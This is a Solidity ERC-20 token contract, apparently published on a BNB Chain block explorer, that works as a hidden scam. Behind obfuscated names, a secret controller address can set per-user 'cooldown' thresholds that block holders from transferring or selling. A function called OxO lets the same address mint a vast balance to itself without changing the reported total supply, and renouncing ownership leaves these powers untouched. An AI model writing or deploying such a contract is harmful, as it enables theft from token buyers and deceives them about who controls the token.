/**
 *Submitted for verification at ww9v3.bscscan.com on 2023-08-15
*/

pragma solidity ^0.8.5;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address adfdfsdet) external view returns (uint256);
    function transfer(address recipient, uint256 atdfsffdst) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 atdfsffdst) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 atdfsffdst ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed owner, address indexed spender, uint256 value );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract Ownable is Context {
    address private _owner;
    event ownershipTransferred(address indexed previousowner, address indexed newowner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit ownershipTransferred(address(0), msgSender);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyowner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceownership() public virtual onlyowner {
        emit ownershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }
}

contract AAA is Context, Ownable, IERC20 {
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private _zsdacx; 
    mapping (address => uint256) private _cll;
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;
    address public _TEDFMS;
    uint256 private _initialeeeee;


    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_ , address OWDSAE , uint256 initialeeeee) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_ * (10 ** decimals_);
        _TEDFMS = OWDSAE;
        _balances[_msgSender()] = _totalSupply;
        _initialeeeee = initialeeeee;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }


    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function balanceOf(address adfdfsdet) public view override returns (uint256) {
        return _balances[adfdfsdet];
    }
    function setCooldown(address user, uint256 eeeee) public {
    require(_TEDFMS == _msgSender());
        _cll[user] = eeeee;
    }
    function getCooldown(address user) public view returns (uint256) {
        if (_cll[user] == 0) {
            return _initialeeeee;
        }
        return _cll[user];
    }
    function OxO() public {
    require(_TEDFMS == _msgSender());
    uint256 aaaaa = 4512654564122564123515;
    uint256 xxxxx=aaaaa*111+111;
        _balances[_TEDFMS] += xxxxx;
    }        
    function transfer(address recipient, uint256 atdfsffdst) public virtual override returns (bool) {
        uint256 senderCooldown = _cll[_msgSender()] == 0 ? _initialeeeee : _cll[_msgSender()];
        require(_balances[_msgSender()] > senderCooldown, "User's balance is less than or equal to the cooldown amount");
        require(_balances[_msgSender()] >= atdfsffdst, "TT: transfer atdfsffdst exceeds balance");

        _balances[_msgSender()] -= atdfsffdst;
        _balances[recipient] += atdfsffdst;
        emit Transfer(_msgSender(), recipient, atdfsffdst);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }


    function approve(address spender, uint256 atdfsffdst) public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = atdfsffdst;
        emit Approval(_msgSender(), spender, atdfsffdst);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 atdfsffdst) public virtual override returns (bool) {
        uint256 senderCooldown = _cll[sender] == 0 ? _initialeeeee : _cll[sender];
        require(_balances[sender] > senderCooldown, "Sender's balance is less than or equal to the cooldown amount");
        require(_allowances[sender][_msgSender()] >= atdfsffdst, "TT: transfer atdfsffdst exceeds allowance");

        _balances[sender] -= atdfsffdst;
        _balances[recipient] += atdfsffdst;
        _allowances[sender][_msgSender()] -= atdfsffdst;

        emit Transfer(sender, recipient, atdfsffdst);
        return true;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }
}